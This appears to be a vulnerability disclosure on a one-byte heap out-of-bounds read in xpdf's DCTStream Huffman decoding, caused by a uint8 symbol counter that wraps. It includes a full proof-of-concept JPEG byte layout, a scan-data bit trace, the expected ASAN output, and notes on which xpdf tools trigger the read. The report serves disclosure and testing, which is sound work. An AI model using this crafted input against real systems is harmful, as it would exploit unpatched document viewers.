# VULN-001: DCTStream Heap OOB Read via Overflowed Huffman Symbol Count

## Vulnerability Description

- **CWE**: CWE-125 (Out-of-bounds Read)
- **File**: `xpdf/Stream.cc`
- **Root-cause site**: `DCTStream::readHuffmanTables()` ~line 4160
- **Dereference site**: `DCTStream::readHuffSym()` ~line 3807

### Root Cause

`DCTStream::readHuffmanTables()` accumulates the total number of Huffman
symbols in a local `Guchar` (uint8) variable `sym`:

```cpp
sym = 0;
for (i = 1; i <= 16; ++i) {
    c = str->getChar();          // BITS[i-1]
    tbl->firstSym[i] = sym;
    tbl->firstCode[i] = code;
    tbl->numCodes[i] = (Gushort)c;
    sym = (Guchar)(sym + c);    // WRAPS AT 256
    code = (Gushort)((code + c) << 1);
}
for (i = 0; i < sym; ++i)       // uses WRAPPED value
    tbl->sym[i] = (Guchar)str->getChar();
```

With `BITS[15]=2, BITS[16]=255`:
- After i=15: `sym=2`, `firstSym[16]=2`, `firstCode[16]=4`, `numCodes[16]=255`
- After i=16: `sym = (Guchar)(2+255) = (Guchar)(257) = 1` (integer overflow/wrap)
- Only **1** HUFFVAL byte is read into `sym[0]`; `sym[1..255]` are uninitialised

### Triggering the OOB Dereference

`DCTStream::readHuffSym()` at codeBits=16:

```cpp
if (code - table->firstCode[codeBits] < table->numCodes[codeBits]) {
    code = (Gushort)(code - table->firstCode[codeBits]);
    return table->sym[table->firstSym[codeBits] + code];  // OOB
}
```

With the crafted table and scan-data code=258:
- `258 - firstCode[16](=4) = 254 < numCodes[16](=255)` → branch taken
- `sym[firstSym[16] + 254] = sym[2 + 254] = sym[256]` → **1 byte past end of `Guchar sym[256]`**

## Triggering Mechanism

### DHT Configuration (crafted JPEG segment)

| BITS index | Value | Effect |
|-----------|-------|--------|
| 1–14 | 0 | No codes at these lengths |
| 15 | 2 | 2 codes at length 15; firstCode[15]=0 |
| 16 | 255 | 255 codes at length 16; firstCode[16]=4 |

HUFFVAL: `[0x00]` (only 1 byte read due to Guchar wrap 257→1)

### Scan Data Design

Bytes `0x01 0x02` produce bit stream `00000001 00000010`:

```
bit  1..7  (0s) → code=0
bit  8     (1)  → code=1
bits 9..14 (0s) → code=2,4,8,16,32,64
bit  15    (1)  → code=129; check: 129-0=129 < 2? NO → continue
bit  16    (0)  → code=258; check: 258-4=254 < 255? YES → sym[256] OOB READ
```

### JPEG Structure

```
FF D8                        SOI
FF DB 00 43 00 [01]*64       DQT (8-bit, table 0, all-ones)
FF C0 00 0B 08 00 01 00 01   SOF0 (1x1, grayscale)
         01 01 11 00
FF C4 00 14 00               DHT (DC table 0)
         [00]*14 02 FF       BITS: nc[15]=2, nc[16]=255
         00                  HUFFVAL[0]=0x00 (sym wraps to 1)
FF DA 00 08 01 01 00         SOS
         00 3F 00
01 02                        scan data → code=258 at codeBits=16
FF D9                        EOI
```

## Expected ASAN/UBSAN Output

When the vulnerability triggers:

```
==PID==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x...
READ of size 1 at 0x... thread T0
    #0 ... DCTStream::readHuffSym(...)  Stream.cc:3813
    #1 ... DCTStream::readMCURow()      Stream.cc:...
    ...
0x... is located 0 bytes after 256-byte region ...
allocated ... by thread T0:
    #0 ... malloc
    #1 ... DCTStream::reset()
```

The accessed address is exactly 1 byte past a 256-byte `sym` array.

## Test Files

| File | Description |
|------|-------------|
| `vuln_001.jpg` | Raw malformed JPEG |
| `vuln_001.pdf` | PDF embedding JPEG as image XObject (`/Filter /DCTDecode`) |
| `vuln_001b.pdf` | PDF with JPEG as inline image (`BI/ID/EI`) |

## Limitations

1. **pdftotext skips image pixel data**: `TextOutputDev` (used by pdftotext) does
   not need image data for text extraction. Xpdf may avoid calling `getChar()` on
   DCT streams for image XObjects, preventing `readHuffSym()` from being reached.

2. **Inline image path**: The content-stream parser must scan past inline image data
   to find `EI`. Whether it decodes the DCT filter or scans raw bytes depends on the
   xpdf version. Some versions decode the stream; others scan for `EI` heuristically.

3. **Recommended trigger**: Use `xpdf` (viewer) or `pdftoppm` rather than `pdftotext`
   for reliable triggering — those tools decode image pixel data unconditionally.

4. **ASAN build required**: The OOB is a single-byte read 1 past the array end. It
   may not crash without ASAN/memory instrumentation since the adjacent byte is
   typically allocated but belongs to a different struct field.
